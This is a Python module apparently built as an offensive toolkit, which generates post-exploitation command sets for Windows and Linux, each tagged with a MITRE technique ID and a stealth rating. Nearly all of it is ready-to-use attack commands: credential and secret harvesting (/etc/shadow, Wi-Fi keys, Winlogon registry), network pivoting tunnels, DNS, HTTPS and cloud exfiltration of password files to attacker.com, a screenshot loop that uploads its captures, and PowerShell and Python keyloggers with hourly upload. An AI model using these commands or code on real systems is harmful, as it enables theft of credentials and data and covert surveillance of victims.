"""
Post-Exploitation Module
System enumeration, pivoting, data exfiltration, and maintaining access after initial compromise.
"""

import asyncio
import json
import base64
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Literal
from enum import Enum


class PostExploitTechnique(str, Enum):
    """Post-exploitation techniques"""
    SYSTEM_ENUM = "system_enumeration"
    NETWORK_PIVOT = "network_pivoting"
    DATA_EXFIL_DNS = "data_exfil_dns"
    DATA_EXFIL_HTTPS = "data_exfil_https"
    DATA_EXFIL_CLOUD = "data_exfil_cloud"
    SCREENSHOT = "screenshot_capture"
    KEYLOGGER = "keylogger"
    CLIPBOARD_MONITOR = "clipboard_monitor"
    WEBCAM_CAPTURE = "webcam_capture"
    AUDIO_RECORD = "audio_recording"


@dataclass
class PostExploitPayload:
    """Post-exploitation payload details"""
    technique: PostExploitTechnique
    platform: str  # windows, linux
    commands: List[str]
    description: str
    requires_admin: bool
    stealth_level: str  # low, medium, high
    mitre_technique: str
    tools_required: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            "technique": self.technique.value,
            "platform": self.platform,
            "commands": self.commands,
            "description": self.description,
            "requires_admin": self.requires_admin,
            "stealth_level": self.stealth_level,
            "mitre_technique": self.mitre_technique,
            "tools_required": self.tools_required
        }


class PostExploitationGenerator:
    """Generator for post-exploitation techniques"""
    
    def __init__(self):
        pass
    
    async def generate_system_enumeration(self) -> PostExploitPayload:
        """Generate system enumeration commands"""
        
        commands = [
            "# ========== WINDOWS ENUMERATION ==========",
            "",
            "# System Information",
            "systeminfo",
            "hostname",
            "whoami /all",
            "net user",
            "net localgroup administrators",
            "",
            "# Network Information",
            "ipconfig /all",
            "route print",
            "arp -a",
            "netstat -ano",
            "netsh wlan show profiles",
            "netsh wlan show profile name=\"WIFI_NAME\" key=clear",
            "",
            "# Running Processes & Services",
            "tasklist /v",
            "wmic process list brief",
            "net start",
            "sc query",
            "",
            "# Installed Software",
            "wmic product get name,version",
            "reg query HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall",
            "",
            "# Scheduled Tasks",
            "schtasks /query /fo LIST /v",
            "",
            "# Firewall Status",
            "netsh advfirewall show allprofiles",
            "netsh advfirewall firewall show rule name=all",
            "",
            "# Antivirus Detection",
            "wmic /namespace:\\\\\\\\root\\\\securitycenter2 path antivirusproduct",
            "Get-MpComputerStatus  # Windows Defender",
            "",
            "# Domain Information",
            "net group /domain",
            "net group 'Domain Admins' /domain",
            "net accounts /domain",
            "nltest /domain_trusts",
            "",
            "# File System",
            "dir /s /b C:\\\\*.txt",
            "dir /s /b C:\\\\*.doc*",
            "dir /s /b C:\\\\*.xls*",
            "dir /s /b C:\\\\*.kdbx  # KeePass",
            "",
            "# Registry Secrets",
            "reg query 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon'",
            "reg query HKCU\\\\Software\\\\SimonTatham\\\\PuTTY\\\\Sessions",
            "",
            "# ========== AUTOMATED TOOLS ==========",
            "",
            "# WinPEAS (Windows Privilege Escalation Awesome Script)",
            "winPEASx64.exe",
            "",
            "# PowerUp (PowerSploit)",
            "powershell -ep bypass",
            "Import-Module .\\PowerUp.ps1",
            "Invoke-AllChecks",
            "",
            "# Seatbelt (C# enumeration)",
            "Seatbelt.exe -group=all",
            "",
            "# SharpUp (C# privilege escalation checks)",
            "SharpUp.exe",
            "",
            "# ========== LINUX ENUMERATION ==========",
            "",
            "# System Information",
            "uname -a",
            "cat /etc/os-release",
            "hostname",
            "whoami",
            "id",
            "groups",
            "",
            "# Network Information",
            "ifconfig -a",
            "ip addr show",
            "ip route",
            "ss -tulpn",
            "netstat -tulpn",
            "arp -a",
            "",
            "# Running Processes",
            "ps aux",
            "ps -ef",
            "top -n 1",
            "",
            "# Users & Groups",
            "cat /etc/passwd",
            "cat /etc/group",
            "cat /etc/shadow  # Requires root",
            "lastlog",
            "w",
            "who",
            "",
            "# SUID Binaries",
            "find / -perm -4000 2>/dev/null",
            "",
            "# Writable Directories",
            "find / -writable -type d 2>/dev/null",
            "",
            "# Capabilities",
            "getcap -r / 2>/dev/null",
            "",
            "# Cron Jobs",
            "cat /etc/crontab",
            "ls -la /etc/cron.*",
            "crontab -l",
            "",
            "# Installed Software",
            "dpkg -l  # Debian/Ubuntu",
            "rpm -qa  # RedHat/CentOS",
            "",
            "# LinPEAS (Linux Privilege Escalation Awesome Script)",
            "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            "",
            "# LinEnum",
            "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
            "chmod +x LinEnum.sh",
            "./LinEnum.sh"
        ]
        
        return PostExploitPayload(
            technique=PostExploitTechnique.SYSTEM_ENUM,
            platform="multi",
            commands=commands,
            description="System enumeration - Comprehensive host and network information gathering",
            requires_admin=False,
            stealth_level="low",
            mitre_technique="T1082",
            tools_required=["WinPEAS", "LinPEAS", "PowerUp", "Seatbelt"]
        )
    
    async def generate_network_pivoting(self) -> PostExploitPayload:
        """Generate network pivoting commands"""
        
        commands = [
            "# ========== NETWORK PIVOTING ==========",
            "",
            "# Method 1: SSH Tunneling (SOCKS Proxy)",
            "# On compromised host:",
            "ssh -D 1080 -N -f user@attacker-machine",
            "",
            "# On attacker (use proxychains):",
            "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf",
            "proxychains nmap -sT 10.10.10.0/24",
            "",
            "# Method 2: SSH Port Forwarding (Local)",
            "# Forward remote port 3389 (RDP) to local 13389:",
            "ssh -L 13389:10.10.10.5:3389 user@pivot-host",
            "# Then RDP to localhost:13389",
            "",
            "# Method 3: SSH Port Forwarding (Remote)",
            "# Forward local port 4444 to remote network:",
            "ssh -R 4444:10.10.10.5:445 user@attacker-machine",
            "",
            "# Method 4: Chisel (Fast TCP/UDP tunnel)",
            "# On attacker:",
            "chisel server -p 8000 --reverse",
            "",
            "# On compromised host:",
            "chisel client 192.168.1.100:8000 R:1080:socks",
            "",
            "# Method 5: Ligolo-ng (Modern tunneling)",
            "# On attacker:",
            "ligolo-ng -selfcert",
            "",
            "# On compromised host:",
            "agent -connect attacker-ip:11601 -ignore-cert",
            "",
            "# Method 6: Metasploit Pivoting",
            "# In meterpreter session:",
            "run autoroute -s 10.10.10.0/24",
            "use auxiliary/server/socks_proxy",
            "set VERSION 5",
            "run",
            "",
            "# Method 7: PowerShell Reverse Port Forward",
            "$listener = [System.Net.Sockets.TcpListener]1337",
            "$listener.Start()",
            "while($true) {",
            "  $client = $listener.AcceptTcpClient()",
            "  $remote = New-Object System.Net.Sockets.TcpClient('10.10.10.5', 445)",
            "  # Relay traffic...",
            "}",
            "",
            "# Method 8: Windows Port Forwarding (netsh)",
            "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.5",
            "",
            "# Method 9: socat Relay",
            "# Forward port 8080 to 10.10.10.5:80:",
            "socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80",
            "",
            "# Method 10: rpivot (Reverse SOCKS proxy)",
            "# On attacker:",
            "python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080",
            "",
            "# On compromised host:",
            "python client.py --server-ip attacker-ip --server-port 9999"
        ]
        
        return PostExploitPayload(
            technique=PostExploitTechnique.NETWORK_PIVOT,
            platform="multi",
            commands=commands,
            description="Network pivoting - Tunnel traffic through compromised host to access internal networks",
            requires_admin=False,
            stealth_level="medium",
            mitre_technique="T1090",
            tools_required=["chisel", "ligolo-ng", "socat", "rpivot"]
        )
    
    async def generate_data_exfil_dns(self) -> PostExploitPayload:
        """Generate DNS exfiltration commands"""
        
        commands = [
            "# ========== DNS DATA EXFILTRATION ==========",
            "",
            "# Method 1: Manual DNS queries",
            "# Encode data to hex/base64:",
            "$data = Get-Content C:\\\\sensitive.txt",
            "$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data))",
            "",
            "# Send via DNS queries (63 char chunks):",
            "for ($i=0; $i -lt $encoded.Length; $i+=63) {",
            "  $chunk = $encoded.Substring($i, [Math]::Min(63, $encoded.Length - $i))",
            "  nslookup \"$chunk.exfil.attacker.com\" attacker-dns-server",
            "}",
            "",
            "# Method 2: PowerShell DNS exfiltration",
            "function Exfil-DNS {",
            "    param($File, $Domain)",
            "    $data = [Convert]::ToBase64String([IO.File]::ReadAllBytes($File))",
            "    for($i=0; $i -lt $data.Length; $i+=63) {",
            "        $chunk = $data.Substring($i, [Math]::Min(63, $data.Length-$i))",
            "        Resolve-DnsName \"$i.$chunk.$Domain\" -Type A | Out-Null",
            "    }",
            "}",
            "Exfil-DNS -File 'C:\\\\passwords.txt' -Domain 'exfil.attacker.com'",
            "",
            "# Method 3: Linux DNS exfiltration",
            "# Encode file:",
            "data=$(cat /etc/passwd | base64 | tr -d '\\n')",
            "",
            "# Send chunks:",
            "for i in $(seq 0 63 ${#data}); do",
            "  chunk=${data:$i:63}",
            "  dig @attacker-dns-server \"$i.$chunk.exfil.attacker.com\" +short",
            "done",
            "",
            "# Method 4: DNSExfiltrator (Tool)",
            "# On attacker (DNS server):",
            "python dnsexfiltrator.py -d attacker.com -p password",
            "",
            "# On victim:",
            "Invoke-DNSExfiltrator -i C:\\\\sensitive.doc -d attacker.com -p password -s attacker-dns-server",
            "",
            "# Method 5: iodine (DNS tunnel)",
            "# On attacker:",
            "iodined -f -c -P password 10.0.0.1 exfil.attacker.com",
            "",
            "# On victim:",
            "iodine -f -P password exfil.attacker.com",
            "",
            "# On attacker DNS server, capture queries:",
            "tcpdump -i eth0 -n port 53 | grep exfil.attacker.com"
        ]
        
        return PostExploitPayload(
            technique=PostExploitTechnique.DATA_EXFIL_DNS,
            platform="multi",
            commands=commands,
            description="DNS exfiltration - Tunnel data through DNS queries to bypass firewall restrictions",
            requires_admin=False,
            stealth_level="high",
            mitre_technique="T1048.003",
            tools_required=["DNSExfiltrator", "iodine", "tcpdump"]
        )
    
    async def generate_data_exfil_https(self) -> PostExploitPayload:
        """Generate HTTPS exfiltration commands"""
        
        commands = [
            "# ========== HTTPS DATA EXFILTRATION ==========",
            "",
            "# Method 1: PowerShell Invoke-WebRequest",
            "$data = Get-Content C:\\\\sensitive.txt",
            "$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data))",
            "Invoke-WebRequest -Uri 'https://attacker.com/upload' -Method POST -Body $encoded",
            "",
            "# Method 2: PowerShell with file upload",
            "$file = 'C:\\\\passwords.xlsx'",
            "$bytes = [IO.File]::ReadAllBytes($file)",
            "$web = New-Object Net.WebClient",
            "$web.UploadData('https://attacker.com/upload', $bytes)",
            "",
            "# Method 3: curl (Linux/Windows)",
            "curl -X POST -d @/etc/passwd https://attacker.com/upload",
            "",
            "# Method 4: PowerShell chunked upload",
            "function Upload-File {",
            "    param($File, $Url)",
            "    $bytes = [IO.File]::ReadAllBytes($File)",
            "    $chunkSize = 1MB",
            "    for($i=0; $i -lt $bytes.Length; $i+=$chunkSize) {",
            "        $chunk = $bytes[$i..[Math]::Min($i+$chunkSize-1, $bytes.Length-1)]",
            "        $encoded = [Convert]::ToBase64String($chunk)",
            "        Invoke-WebRequest -Uri \"$Url?chunk=$i\" -Method POST -Body $encoded",
            "    }",
            "}",
            "",
            "# Method 5: Python requests",
            "import requests",
            "with open('/etc/shadow', 'rb') as f:",
            "    files = {'file': f}",
            "    requests.post('https://attacker.com/upload', files=files)",
            "",
            "# Method 6: Archive and upload",
            "# Windows:",
            "Compress-Archive -Path C:\\\\Data -DestinationPath C:\\\\Temp\\\\data.zip",
            "Invoke-WebRequest -Uri 'https://attacker.com/upload' -Method POST -InFile C:\\\\Temp\\\\data.zip",
            "",
            "# Linux:",
            "tar -czf /tmp/data.tar.gz /home/user/documents",
            "curl -F 'file=@/tmp/data.tar.gz' https://attacker.com/upload",
            "",
            "# Method 7: Pastebin exfil (anonymous)",
            "$data = Get-Content C:\\\\passwords.txt | Out-String",
            "$body = @{api_paste_code=$data; api_option='paste'} | ConvertTo-Json",
            "Invoke-WebRequest -Uri 'https://pastebin.com/api/api_post.php' -Method POST -Body $body",
            "",
            "# Attacker HTTPS listener (Python):",
            "from http.server import HTTPServer, BaseHTTPRequestHandler",
            "class UploadHandler(BaseHTTPRequestHandler):",
            "    def do_POST(self):",
            "        length = int(self.headers['Content-Length'])",
            "        data = self.rfile.read(length)",
            "        with open('exfil_data', 'ab') as f:",
            "            f.write(data)",
            "        self.send_response(200)",
            "HTTPServer(('0.0.0.0', 443), UploadHandler).serve_forever()"
        ]
        
        return PostExploitPayload(
            technique=PostExploitTechnique.DATA_EXFIL_HTTPS,
            platform="multi",
            commands=commands,
            description="HTTPS exfiltration - Upload data via encrypted HTTPS connections",
            requires_admin=False,
            stealth_level="medium",
            mitre_technique="T1041",
            tools_required=["curl", "python", "requests"]
        )
    
    async def generate_data_exfil_cloud(self) -> PostExploitPayload:
        """Generate cloud storage exfiltration commands"""
        
        commands = [
            "# ========== CLOUD STORAGE EXFILTRATION ==========",
            "",
            "# Method 1: AWS S3",
            "# Upload to S3 bucket:",
            "aws s3 cp C:\\\\sensitive.txt s3://exfil-bucket/",
            "",
            "# PowerShell:",
            "$file = 'C:\\\\passwords.xlsx'",
            "aws s3 cp $file s3://exfil-bucket/$(Get-Date -Format 'yyyyMMdd-HHmmss').xlsx",
            "",
            "# Method 2: Google Drive",
            "# Using rclone:",
            "rclone copy C:\\\\Data remote:exfil-folder",
            "",
            "# Method 3: Dropbox",
            "# Install Dropbox CLI:",
            "pip install dropbox",
            "",
            "# Python script:",
            "import dropbox",
            "dbx = dropbox.Dropbox('ACCESS_TOKEN')",
            "with open('/etc/passwd', 'rb') as f:",
            "    dbx.files_upload(f.read(), '/exfil/passwd')",
            "",
            "# Method 4: OneDrive",
            "# Using OneDrive CLI:",
            "onedrive --synchronize --upload-only --source-directory C:\\\\Sensitive",
            "",
            "# Method 5: Mega.nz",
            "# Install mega-cmd:",
            "mega-put C:\\\\passwords.txt /exfil/",
            "",
            "# Method 6: Transfer.sh (anonymous)",
            "# Upload file:",
            "curl --upload-file ./sensitive.txt https://transfer.sh/sensitive.txt",
            "",
            "# Method 7: WeTransfer",
            "# Using wetransfer-python-sdk:",
            "pip install wetransfer",
            "python -c \"from wetransfer import WeTransfer; wt = WeTransfer('API_KEY'); wt.upload('file.zip', 'attacker@email.com')\"",
            "",
            "# Method 8: GitHub (stealthy)",
            "# Create repo and push:",
            "cd /tmp",
            "git init exfil-data",
            "cd exfil-data",
            "cp /etc/shadow ./data.txt",
            "git add data.txt",
            "git commit -m 'data'",
            "git remote add origin https://github.com/attacker/exfil-repo.git",
            "git push -u origin master",
            "",
            "# Method 9: Imgur (image steganography)",
            "# Hide data in image and upload:",
            "steghide embed -cf image.jpg -ef secret.txt",
            "curl -X POST -F 'image=@image.jpg' https://api.imgur.com/3/image"
        ]
        
        return PostExploitPayload(
            technique=PostExploitTechnique.DATA_EXFIL_CLOUD,
            platform="multi",
            commands=commands,
            description="Cloud storage exfiltration - Upload data to cloud services (S3, Drive, Dropbox)",
            requires_admin=False,
            stealth_level="low",
            mitre_technique="T1567",
            tools_required=["aws-cli", "rclone", "dropbox", "mega-cmd"]
        )
    
    async def generate_screenshot_capture(self) -> PostExploitPayload:
        """Generate screenshot capture commands"""
        
        commands = [
            "# ========== SCREENSHOT CAPTURE ==========",
            "",
            "# Windows PowerShell:",
            "Add-Type -AssemblyName System.Windows.Forms",
            "$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds",
            "$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)",
            "$graphics = [System.Drawing.Graphics]::FromImage($bitmap)",
            "$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)",
            "$bitmap.Save('C:\\\\Temp\\\\screenshot.png')",
            "",
            "# Windows native (snipping tool):",
            "snippingtool /clip",
            "",
            "# Linux (X11):",
            "import -window root screenshot.png",
            "# OR",
            "scrot screenshot.png",
            "# OR",
            "gnome-screenshot -f screenshot.png",
            "",
            "# Python (cross-platform):",
            "pip install pillow mss",
            "",
            "import mss",
            "with mss.mss() as sct:",
            "    sct.shot(output='screenshot.png')",
            "",
            "# Continuous screenshots:",
            "while($true) {",
            "    $timestamp = Get-Date -Format 'yyyyMMdd-HHmmss'",
            "    # Screenshot code here",
            "    $bitmap.Save(\"C:\\\\Temp\\\\screen_$timestamp.png\")",
            "    Start-Sleep -Seconds 60",
            "}",
            "",
            "# Exfiltrate screenshots:",
            "Get-ChildItem C:\\\\Temp\\\\screen_*.png | ForEach-Object {",
            "    Invoke-WebRequest -Uri 'https://attacker.com/upload' -Method POST -InFile $_.FullName",
            "}"
        ]
        
        return PostExploitPayload(
            technique=PostExploitTechnique.SCREENSHOT,
            platform="multi",
            commands=commands,
            description="Screenshot capture - Take screenshots of victim's screen",
            requires_admin=False,
            stealth_level="medium",
            mitre_technique="T1113",
            tools_required=["mss", "scrot", "imagemagick"]
        )
    
    async def generate_keylogger(self) -> PostExploitPayload:
        """Generate keylogger commands"""
        
        commands = [
            "# ========== KEYLOGGER ==========",
            "",
            "# Windows PowerShell keylogger:",
            "$api = @'",
            "[DllImport(\"user32.dll\")]",
            "public static extern int GetAsyncKeyState(int vKey);",
            "'@",
            "Add-Type -MemberDefinition $api -Name Keys -Namespace Win32",
            "",
            "$log = 'C:\\\\Temp\\\\keylog.txt'",
            "while($true) {",
            "    for($i=0; $i-lt256; $i++) {",
            "        $state = [Win32.Keys]::GetAsyncKeyState($i)",
            "        if($state -eq -32767) {",
            "            $key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i)",
            "            Add-Content $log \"$key\"",
            "        }",
            "    }",
            "    Start-Sleep -Milliseconds 10",
            "}",
            "",
            "# Python keylogger (pynput):",
            "pip install pynput",
            "",
            "from pynput import keyboard",
            "def on_press(key):",
            "    with open('keylog.txt', 'a') as f:",
            "        f.write(str(key))",
            "with keyboard.Listener(on_press=on_press) as listener:",
            "    listener.join()",
            "",
            "# Python keylogger (keyboard module):",
            "pip install keyboard",
            "",
            "import keyboard",
            "keyboard.on_press(lambda e: open('log.txt','a').write(e.name+' '))",
            "keyboard.wait()",
            "",
            "# C# keylogger (SetWindowsHookEx):",
            "// Full implementation requires Windows Hooks API",
            "// See: https://github.com/SecurityXploded/KeyLogger",
            "",
            "# Metasploit keylogger:",
            "# In meterpreter:",
            "keyscan_start",
            "# Wait...",
            "keyscan_dump",
            "keyscan_stop",
            "",
            "# Exfiltrate logs periodically:",
            "while($true) {",
            "    $data = Get-Content C:\\\\Temp\\\\keylog.txt",
            "    Invoke-WebRequest -Uri 'https://attacker.com/upload' -Method POST -Body $data",
            "    Clear-Content C:\\\\Temp\\\\keylog.txt",
            "    Start-Sleep -Seconds 3600  # Every hour",
            "}"
        ]
        
        return PostExploitPayload(
            technique=PostExploitTechnique.KEYLOGGER,
            platform="multi",
            commands=commands,
            description="Keylogger - Record all keystrokes from victim's keyboard",
            requires_admin=False,
            stealth_level="high",
            mitre_technique="T1056.001",
            tools_required=["pynput", "keyboard", "metasploit"]
        )
    
    async def generate_all_techniques(self, platform: Literal["windows", "linux", "multi"] = "multi") -> List[PostExploitPayload]:
        """Generate all post-exploitation techniques"""
        
        techniques = []
        
        techniques.append(await self.generate_system_enumeration())
        techniques.append(await self.generate_network_pivoting())
        techniques.append(await self.generate_data_exfil_dns())
        techniques.append(await self.generate_data_exfil_https())
        techniques.append(await self.generate_data_exfil_cloud())
        techniques.append(await self.generate_screenshot_capture())
        techniques.append(await self.generate_keylogger())
        
        return techniques


async def main():
    """Example usage"""
    generator = PostExploitationGenerator()
    
    print("[*] Generating post-exploitation techniques...")
    all_techniques = await generator.generate_all_techniques("multi")
    print(f"[+] Generated {len(all_techniques)} post-exploitation techniques")
    
    # Display network pivoting
    pivot = [t for t in all_techniques if t.technique == PostExploitTechnique.NETWORK_PIVOT][0]
    print(f"\n[+] Network Pivoting:")
    print(f"    Stealth Level: {pivot.stealth_level}")
    print(f"    MITRE: {pivot.mitre_technique}")
    print(f"    Tools: {', '.join(pivot.tools_required)}")


if __name__ == "__main__":
    asyncio.run(main())
